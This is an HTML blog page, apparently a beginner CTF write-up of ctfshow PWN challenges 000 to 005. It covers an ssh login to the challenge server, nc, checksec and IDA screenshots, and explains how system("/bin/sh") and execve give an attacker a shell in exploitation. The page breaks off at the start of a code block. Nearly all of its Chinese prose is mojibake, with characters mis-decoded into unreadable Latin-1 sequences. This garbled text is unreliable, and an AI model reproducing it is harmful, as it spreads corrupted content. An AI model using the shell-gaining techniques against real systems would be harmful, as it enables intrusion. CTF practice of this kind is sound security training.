                <img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow_hu_2da768fbb28f8f82.png"
                        srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow_hu_2da768fbb28f8f82.png 800w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow_hu_ecf2a63f33ea59e3.png 1600w"
                        width="800" 
                        height="405" 
                        loading="lazy"
                        alt="Featured image of post CTFshow-å…¥é—¨PWN-writeup" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
                CTF_writeup
            </a>
        
            <a href="/categories/ctfpwn/" style="background-color: #2a9d8f; color: #fff;">
                CTFpwn
            </a>
        
            <a href="/categories/ctf%E5%85%A5%E9%97%A8/" >
                CTFå…¥é—¨
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/">CTFshow-å…¥é—¨PWN-writeup</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼ŒPWNå…¥é—¨_wrtieupï¼Œä¼šå‘˜å¥—é¤360é¢˜
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-08-27</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>[TOC]</p>
<p>**å‰æ–‡ï¼šä»¥ä¸‹æ˜¯æˆ‘<a class="link" href="https://ctf.show/challenges"  target="_blank" rel="noopener"
    >ctfshow</a>çš„PWNåšé¢˜è®°å½•ï¼Œæ¬¢è¿å„ä½å‰æ¥è§‚çœ‹ï¼Œå°å¼Ÿé¢†æ•™ï¼**è¿˜æœ‰å°±æ˜¯ctfshow-pwnæ˜¯æˆ‘å…¥é—¨PWNçš„ç¬¬ä¸€å¥—é¢˜ï¼Œæ¯”è¾ƒåŸºç¡€ï¼Œçœ‹å®˜æ–¹writeupå¯ä»¥çŸ¥é“æ¯”è¾ƒç®€æ´ï¼Œä½†æœ‰äº›æˆ‘çœ‹ä¸æ‡‚ï¼Œè¿™æ˜¯æˆ‘è‡ªå·±åšçš„è¿‡ç¨‹ä¸­å†™çš„ï¼Œéƒ½æ˜¯å‘è‡ªå†…å¿ƒç†è§£å®ƒä»¬çš„è¯ï¼Œæœ‰äº›å¯èƒ½æ¯”è¾ƒå•°å—¦ï¼Œä½†ä¹Ÿå¿…é¡»è¿™æ ·ï¼Œå› ä¸ºç«™åœ¨æ–°æ‰‹è§’åº¦æ¥çœ‹å¿…é¡»è¦è¿™ç§å•°å—¦æ–¹å¼å»ç†è§£æ‰èƒ½æ›´æ·±åˆ»ï¼Œæœ‰è€å¿ƒçš„æœ‹å‹å¯ä»¥ä¸€ç›´çœ‹ä¸‹å»ï¼Œå½“ç„¶ä¹Ÿæ¬¢è¿PWNå¤§ä½¬å‰æ¥æŒ‘æˆ˜æˆ‘ï¼ï¼ï¼ğŸ˜„</p>
<h2 id="test_your_nc">Test_your_nc
</h2><h3 id="pwn_000">PWN_000
</h3><p><a class="link" href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ"  target="_blank" rel="noopener"
    >ä¸“ç”¨è™šæ‹Ÿæœºé•œåƒ</a>ï¼Œå…¨å¥—åœ¨è¿™é‡Œï¼Œæå–ç showï¼›è™šæ‹Ÿæœºé•œåƒï¼Œç”¨æˆ·åä¸ºctfshowï¼Œå¯†ç æ˜¯ctfshowã€‚</p>
<p>çœ‹äº†è¯¾ä¹Ÿå•¥éƒ½ä¸ä¼šæˆ–è€…å·¥å…·ä¸ä¼šä¸‹çœ‹è¿™&ndash;&gt;<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/"  target="_blank" rel="noopener"
    >CTF Wiki-PWN</a></p>
<p>è§£é¢˜è¿‡ç¨‹ï¼š</p>
<p>sshè¿æ¥ï¼ˆè®°å¾—ç»™è™šæ‹Ÿæœºkali\Ubuntuæˆ–è€…ä¸»æœºè®¾ç½®æ‰“å¼€SSHï¼‰ï¼š</p>
<p><code>ssh ctfshow@pwn.challenge.ctf.show -pxxxx</code></p>
<p>ä¸€å¼€å§‹ä¼šè®©ä½ è¾“å…¥yes/noçš„ï¼Œç›´æ¥yesï¼Œç„¶åè¾“å…¥å¯†ç ï¼Œç­‰è¿›ç¨‹ç»“æŸä¼šæœ‰ä¸ªäº¤äº’shell</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/1.png"
	width="1184"
	height="570"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/1_hu_dff3e732402d7aaa.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/1_hu_5121a93a292ddbe4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="498px"
	
></p>
<p>ç”¨å‘½ä»¤lsæ‰“å¼€çœ‹ä¸€ä¸‹æœ‰å•¥æ–‡ä»¶ï¼Œçœ‹åˆ°æœ‰ä¸ªctfshow_flagçš„æ–‡ä»¶ï¼ŒçŒœæ˜¯ä¸ªè£…flagçš„æ–‡ä»¶å¤¹ï¼Œç›´æ¥ç”¨catå‘½ä»¤æ‰“å¼€å°±å¥½ã€‚æ³¨æ„æ–œæ /ã€‚</p>
<h3 id="pwn_001">PWN_001
</h3><p>é¢˜ç›®  ï¼šæä¾›åé—¨å‡½æ•°ï¼Œè¿ä¸Šå³å¯å¾—åˆ°flag</p>
<p>è¿™é‡Œæœ‰ç”¨åˆ°â€œ<a class="link" href="https://ctf.xidian.edu.cn/wiki/13"  target="_blank" rel="noopener"
    ><code>nc</code></a>â€è¿æ¥ï¼Œå¯ä»¥äº†è§£ä¸€ä¸‹ï¼Œæ–¹ä¾¿åç»­åšé¢˜ã€‚å½“ç„¶Kaliè‡ªå¸¦ncè¿æ¥çš„ï¼Œä½ ç”¨Kaliå¹²PWNä¹Ÿè¡Œã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/2.png"
	width="826"
	height="310"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/2_hu_d89a142dd65a19e2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/2_hu_5516dc48b2b77e6e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="266"
		data-flex-basis="639px"
	
></p>
<p>è¿™é¢˜é€åˆ†çš„ï¼Œncè¿æ¥ä¸€ä¸‹å°±çˆ†flagäº†ã€‚</p>
<p>ä¸è¿‡è¯´å®è¯æˆ‘æ˜¯çœŸä¸çŸ¥é“PWN_001æ–‡ä»¶ç»™æ¥å¹²å˜›çš„ï¼Œç›´æ¥ncäº¤äº’ä¸€ä¸‹å°±å‡ºflagäº†ï¼Œè¿™é¢˜æ²¡ææ‡‚ctfshowæ„å›¾åœ¨å“ªã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/3.png"
	width="1010"
	height="246"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/3_hu_e6fbe5354a4e4e53.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/3_hu_9234984ec0f35806.png 1024w"
	loading="lazy"
	
		alt="checksecè§£æelfæ ¼å¼ä¿¡æ¯ã€äºŒè¿›åˆ¶æ–‡ä»¶ä¿æŠ¤é…ç½®"
	
	
		class="gallery-image" 
		data-flex-grow="410"
		data-flex-basis="985px"
	
></p>
<p>ä¸è¿‡æˆ‘ç”¨äº†ä¸‹åˆšå­¦çš„æŒ‡ä»¤checksecçœ‹äº†çœ‹ELFæ–‡ä»¶ä¿¡æ¯ï¼Œå‘ç°æ˜¯æ²¡å¼€canaryä¿æŠ¤çš„ï¼Œå¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´&hellip;</p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯64ä½ä»…å…³é—­Canaryä¿æŠ¤ã€‚</p>
<p>æ¥ç€ç”¨64ä½IDAæ‰“å¼€æŸ¥çœ‹mainå‡½æ•°ï¼ˆæŒ‰F5è¿›å…¥åæ±‡ç¼–ï¼‰ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/4.png"
	width="1375"
	height="790"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/4_hu_2ae06a810be6f21f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/4_hu_8b6f5df4cd345cc8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="174"
		data-flex-basis="417px"
	
></p>
<p>æ€ªä¸å¾—ç›´æ¥çˆ†flagå‡ºæ¥å‘¢ã€‚åé—¨systemå‡½æ•°ç›´æ¥è¿è¡Œäº†ã€‚</p>
<h3 id="pwn_002">PWN_002
</h3><p>é¢˜ç›®ï¼š  ç»™ä½ ä¸€ä¸ªshellï¼Œè¿™æ¬¡éœ€è¦ä½ è‡ªå·±å»è·å¾—flag</p>
<p>åˆ°è¿™é‡Œåº¦è¿‡æ–°æ‰‹æœŸäº†ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/5.png"
	width="765"
	height="260"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/5_hu_e343e2a59c5e743.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/5_hu_4937eed7794a387b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="294"
		data-flex-basis="706px"
	
></p>
<p>è¿™é‡Œéœ€è¦æˆ‘ä»¬è¾“å…¥æŒ‡ä»¤äº†ï¼Œä¸€èˆ¬æ¥è¯´åšé¢˜ä¹ æƒ¯çœ‹åˆ°è¿™æ ·ç›´æ¥lsç§’çš„ï¼Œä¸è¿‡åƒæˆ‘è¿™æ ·å…¥é—¨çº§åˆ«çš„è¿˜å¾—ç”¨IDAç¢ç£¨ç¢ç£¨ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/8.png"
	width="640"
	height="160"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/8_hu_5bc43d6c8900b4ef.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/8_hu_e468d492633fbadf.png 1024w"
	loading="lazy"
	
		alt="checksecåˆ†æ"
	
	
		class="gallery-image" 
		data-flex-grow="400"
		data-flex-basis="960px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/6.png"
	width="1374"
	height="555"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/6_hu_540555b971908944.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/6_hu_a88e21f83ae2c018.png 1024w"
	loading="lazy"
	
		alt="IDA-x64ä½mainç¨‹åºçš„åç¼–è¯‘"
	
	
		class="gallery-image" 
		data-flex-grow="247"
		data-flex-basis="594px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯æ²¡canaryä¿æŠ¤çš„</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/7.png"
	width="909"
	height="484"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/7_hu_6dedf0753937e2ce.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/7_hu_4bed3d833e192498.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="450px"
	
></p>
<p>çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªç–‘é—®ï¼Œä¸ºä»€ä¹ˆsystemæœ‰è¿™ä¹ˆå¤§å¨åŠ›ï¼Ÿï¼Œè¿™æ¬¡systemé‡Œè¾¹æ˜¯ä¸€ä¸ª/bin/shçš„è½¯é“¾æ¥ï¼Œå¾ˆç±»ä¼¼æˆ‘ä»¬çš„æ–‡ä»¶åœ°å€</p>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>system(&quot;/bin/sh&quot;);</code> æ˜¯æ¼æ´åˆ©ç”¨ä¸­è·å–ç³»ç»Ÿ shell çš„æ ¸å¿ƒæ“ä½œï¼Œå…¶å·¥ä½œåŸç†æ¶‰åŠ<strong>å‡½æ•°è°ƒç”¨</strong>ã€<strong>ç³»ç»Ÿè°ƒç”¨</strong>å’Œ<strong>è¿›ç¨‹åˆ›å»º</strong>ä¸‰ä¸ªå±‚æ¬¡ï¼Œæœ¬è´¨æ˜¯é€šè¿‡æ ‡å‡†åº“å‡½æ•° <code>system</code> å¯åŠ¨ä¸€ä¸ª <code>/bin/sh</code> è¿›ç¨‹ï¼ˆå³å‘½ä»¤è¡Œè§£é‡Šå™¨ï¼‰ï¼Œè®©æ”»å‡»è€…è·å¾—äº¤äº’æƒé™ã€‚</p>
</blockquote></blockquote>
<p><code>system</code> æ˜¯ C æ ‡å‡†åº“ï¼ˆlibcï¼‰ä¸­çš„å‡½æ•°ï¼ŒåŸå‹ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">system</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">command</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote class="alert alert-error">
    <blockquote>
<p>å®ƒçš„åŠŸèƒ½æ˜¯<strong>æ‰§è¡Œå‚æ•° <code>command</code> æŒ‡å‘çš„å­—ç¬¦ä¸²ä½œä¸ºç³»ç»Ÿå‘½ä»¤</strong>ï¼Œç›¸å½“äºåœ¨ç»ˆç«¯ä¸­è¾“å…¥è¯¥å‘½ä»¤å¹¶æ‰§è¡Œã€‚</p>
</blockquote></blockquote>
<p>system()å‡½æ•°å…ˆforkä¸€ä¸ªå­è¿›ç¨‹ï¼Œåœ¨è¿™ä¸ªå­è¿›ç¨‹ä¸­è°ƒç”¨/bin/sh -cæ¥æ‰§è¡ŒcommandæŒ‡å®šçš„å‘½ä»¤ã€‚/bin/shåœ¨ç³»ç»Ÿä¸­ä¸€èˆ¬æ˜¯ä¸ªè½¯é“¾æ¥ï¼ŒæŒ‡å‘dashæˆ–è€…bashç­‰å¸¸ç”¨çš„shellï¼Œ-cé€‰é¡¹æ˜¯å‘Šè¯‰shellä»å­—ç¬¦ä¸²commandä¸­è¯»å–è¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆshellå°†æ‰©å±•commandä¸­çš„ä»»ä½•ç‰¹æ®Šå­—ç¬¦ï¼‰ã€‚çˆ¶è¿›ç¨‹åˆ™è°ƒç”¨waitpid()å‡½æ•°æ¥ä¸ºå˜æˆåƒµå°¸çš„å­è¿›ç¨‹æ”¶å°¸ï¼Œè·å¾—å…¶ç»“æŸçŠ¶æ€ï¼Œç„¶åå°†è¿™ä¸ªç»“æŸçŠ¶æ€è¿”å›ç»™system()å‡½æ•°çš„è°ƒç”¨è€…ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>system(&quot;/bin/sh&quot;)</code> çš„å·¥ä½œåŸç†å¯ç®€åŒ–ä¸ºï¼š
<strong>é€šè¿‡ <code>system</code> å‡½æ•°åˆ›å»ºå­è¿›ç¨‹ â†’ å­è¿›ç¨‹æ‰§è¡Œ <code>/bin/sh</code> ç¨‹åº â†’ å¯åŠ¨äº¤äº’å¼ shell ç¯å¢ƒ</strong>ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯æ¼æ´åˆ©ç”¨ä¸­æœ€å¸¸ç”¨çš„<strong>è·å–æƒé™</strong>çš„æ–¹å¼ â€”â€” æ— è®ºé€šè¿‡æ ˆæº¢å‡ºã€ROP è¿˜æ˜¯ ret2libcï¼Œæœ€ç»ˆç›®æ ‡éƒ½æ˜¯è®©ç¨‹åºæ‰§è¡Œè¿™æ¡è¯­å¥ï¼ˆæˆ–ç­‰æ•ˆçš„ç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚</p>
</blockquote></blockquote>
<h3 id="pwn_003">PWN_003
</h3><p>é¢˜ç›®ï¼š  å“ªä¸€ä¸ªå‡½æ•°æ‰èƒ½è¯»å–flagï¼Ÿ</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/9.png"
	width="835"
	height="485"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/9_hu_cf2d18ee43fc45c9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/9_hu_4af22d79b2909177.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="413px"
	
></p>
<p>é€šè¿‡å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥é€‰é¡¹â€6â€ä¸ºæˆ‘ä»¬æ‰€éœ€è¦çš„åé—¨å‡½æ•°ï¼Œå…¶ä»–çš„å‡ä¸ä¼šå¾—åˆ°æˆ‘ä»¬æ‰€æƒ³è¦çš„flagï¼Œåœ¨systemå‡½æ•°é‡Œé¢çš„å‘½ä»¤éƒ½æ˜¯åœ¨ç»ˆç«¯æ‰§è¡Œçš„ï¼Œèµ‹äºˆsystemæƒé™è¾ƒå¤§ï¼Œåœ¨æˆ‘æ‰€å†™çš„æ–‡ç« é‡Œï¼ŒåŒ…æ‹¬PWNå…¥é—¨çŸ¥è¯†è®²è§£å’Œæ“ä½œç³»ç»Ÿéƒ½æ˜ç¡®æŒ‡å‡ºSYSTEMæ˜¯ä¸æ“ä½œç³»ç»Ÿå†…æ ¸æ¥è§¦çš„ï¼Œæ¯”Administratorsçš„æƒé™è¿˜è¦ç¨å¤§ã€‚</p>
<p>ç›´æ¥é€‰6ç§’äº†ï¼Œä½†é™¤è¿™ç§é€åˆ†çš„ï¼Œå…¶å®è¿˜éœ€è¦ææ¸…è¿è¡Œçš„é€»è¾‘ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/10.png"
	width="1390"
	height="554"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/10_hu_c9707c3fe7bf59e8.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/10_hu_b592fb61e24a27ee.png 1024w"
	loading="lazy"
	
		alt="IDAx64ä½ç¨‹åºåç¼–è¯‘"
	
	
		class="gallery-image" 
		data-flex-grow="250"
		data-flex-basis="602px"
	
></p>
<p>è·Ÿè¿›ä¸€ä¸‹menuå‡½æ•°é‡Œè¾¹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/11.png"
	width="726"
	height="280"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/11_hu_3d734164c38877e4.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/11_hu_685776f269a503fb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="259"
		data-flex-basis="622px"
	
></p>
<p>å›åˆ°mainè·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªâ€œ6â€çš„å‡½æ•°ï¼Œçœ‹çœ‹é‡Œå¤´æ˜¯ä¸æ˜¯çœŸåœ¨æ‰§è¡Œsystemåé—¨å‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/12.png"
	width="744"
	height="240"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/12_hu_9db861ef6fbcf71d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/12_hu_9d996ee2d6fc5f89.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="310"
		data-flex-basis="744px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/13.png"
	width="501"
	height="119"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/13_hu_b70d12fb710b2ef9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/13_hu_c960f6a7ed96e8b6.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="421"
		data-flex-basis="1010px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç¡®å®æ˜¯æ‰§è¡Œäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå°±èƒ½å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„flagã€‚</p>
<h3 id="pwn_004">PWN_004
</h3><p>é¢˜ç›®ï¼š  æˆ–è®¸éœ€è¦å…ˆå¾—åˆ°æŸä¸ªç¥ç§˜å­—ç¬¦</p>
<p>çœŸå¤Ÿé˜´é—´çš„ï¼Œå•¥ä¹Ÿä¸ç»™äº†ï¼Œæ‰ç¬¬å‡ é“å•Šå°±ä¸Šå¼ºåº¦äº†ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/14.png"
	width="1060"
	height="574"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/14_hu_fb649637a5b6a11b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/14_hu_c8ef954931f877ea.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="184"
		data-flex-basis="443px"
	
></p>
<p>checksecçœ‹çœ‹ï¼Œç„¶åIDAåç¼–è¯‘çœ‹çœ‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/15.png"
	width="481"
	height="159"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/15_hu_5f0f4805cec82d66.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/15_hu_e21b6ee28222ffbe.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="302"
		data-flex-basis="726px"
	
></p>
<p>64ä½äºŒè¿›åˆ¶ä¿æŠ¤å…¨å¼€&hellip;</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/16.png"
	width="753"
	height="341"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/16_hu_ca7b56f27f75a918.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/16_hu_6ad185fb146bb9a2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="529px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªä¼¼æ›¾ç›¸è¯†çš„å‡½æ•°ï¼šstrcpyï¼ˆå¤åˆ¶å‡½æ•°æŠŠxxå¤åˆ¶ç»™s1ï¼Œä¹Ÿå¯èµ·åˆ°èµ‹å€¼çš„ä½œç”¨ï¼‰ã€strcmpï¼ˆæ¯”è¾ƒå‡½æ•°ï¼Œå¯¹æ¯”ï¼Œåˆ¤æ–­ä½œç”¨ï¼‰ã€execveï¼ˆï¼‰ï¼›æˆ‘æ›¾è¯´è¿‡æ±‡ç¼–è¯­è¨€çš„cmpå°±æœ‰æ¯”è¾ƒä½œç”¨ï¼Œè¿™ä¹Ÿç®—æ˜¯ç±»æ¯”å§ï¼Œå›æƒ³èµ·æ¥çš„ï¼Œä¸è¿‡ç”¨AIæœä¸€ä¸‹ä¹Ÿè¡Œã€‚</p>
<p>æ¥è¯´ä¸‹execveå§ï¼Œä¸Šé¢˜è®²è¿‡systemå‡½æ•°ï¼Œè¿™ä¸ªä¹Ÿåº”è¯¥çŸ¥é“çš„ï¼š</p>
<p><code>execve</code> æ˜¯ Unix/Linux ç³»ç»Ÿä¸­æœ€æ ¸å¿ƒçš„<strong>ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰</strong> ä¹‹ä¸€ï¼Œç”¨äº<strong>åœ¨å½“å‰è¿›ç¨‹ä¸­åŠ è½½å¹¶æ‰§è¡Œä¸€ä¸ªæ–°çš„ç¨‹åº</strong>ï¼Œæ›¿æ¢å½“å‰è¿›ç¨‹çš„ä»£ç ã€æ•°æ®å’Œå †æ ˆï¼Œå®ç°è¿›ç¨‹ â€œå˜èº«â€ã€‚å®ƒæ˜¯æ‰€æœ‰ç¨‹åºå¯åŠ¨å’Œæ›¿æ¢çš„åº•å±‚åŸºç¡€ï¼ŒåŒ…æ‹¬ <code>system</code> å‡½æ•°ã€shell æ‰§è¡Œå‘½ä»¤ç­‰æœ€ç»ˆéƒ½ä¼šä¾èµ– <code>execve</code> å®Œæˆã€‚</p>
<p>çœ‹åˆ°è¿™æ®µä»£ç ï¼Œå¤§è‡´æ„æ€æ˜¯ï¼Œè®©s1ç­‰äºâ€œCTFshowPWNâ€è¿™æ®µå­—ç¬¦ä¸²ï¼Œç„¶ååˆ°ifåˆ¤æ–­è¯­å¥è¿™è¿›è¡Œæ¯”è¾ƒï¼š<strong>å¦‚æœs1å’Œs2ç›¸ç­‰</strong>ï¼ˆè¿™é‡Œçš„ï¼ä¸æ˜¯æˆ‘ä»¬Cè¯­è¨€ä¸­çš„â€œä¸â€çš„æ„æ€å•Šï¼‰ï¼Œå°±æ‰§è¡Œexecveå‡½æ•°ï¼Œå¯åŠ¨äº¤äº’æƒé™ï¼Œä»è€Œå¾—åˆ°flagã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/17.png"
	width="890"
	height="506"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/17_hu_cb606be9be72c140.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/17_hu_e8a05d11d9a5f65f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="422px"
	
></p>
<p>è‡³æ­¤ï¼šä¸‹ä¸€èŠ‚å°±å¼€å§‹å‰ç½®åŸºç¡€äº†ï¼Œå¼€å§‹åº”ç”¨<a class="link" href="https://expl0rer.top/p/pwn-1/"  target="_blank" rel="noopener"
    >PWN-1</a>ã€<a class="link" href="https://expl0rer.top/p/pwn-2/"  target="_blank" rel="noopener"
    >PWN-2</a>ã€<a class="link" href="https://expl0rer.top/p/pwn-3/"  target="_blank" rel="noopener"
    >PWN-3</a>æ‰€å­¦çš„çŸ¥è¯†äº†ã€‚</p>
<h2 id="å‰ç½®åŸºç¡€">å‰ç½®åŸºç¡€
</h2><h3 id="pwn_005">PWN_005
</h3><p>é¢˜ç›®ï¼šè¿è¡Œæ­¤æ–‡ä»¶ï¼Œå°†å¾—åˆ°çš„å­—ç¬¦ä¸²ä»¥ctfshow{xxxxx}æäº¤ã€‚</p>
<p>å¦‚ï¼šè¿è¡Œæ–‡ä»¶å è¾“å‡ºçš„å†…å®¹ä¸º Hello_World</p>
<p>æäº¤çš„flagå€¼ä¸ºï¼šctfshow{Hello_World}</p>
<p><strong>æ³¨ï¼šè®¡ç»„åŸç†é¢˜å‹åç»­çš„flagä¸­åœ°å€å­—æ¯å¤§å†™</strong></p>
<p><a class="link" href="PWN_005%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_005%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<p>Welcome_to_CTFshow.asmæ–‡æœ¬æ‰“å¼€åå‘ç°æ˜¯æ±‡ç¼–è¯­è¨€æ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
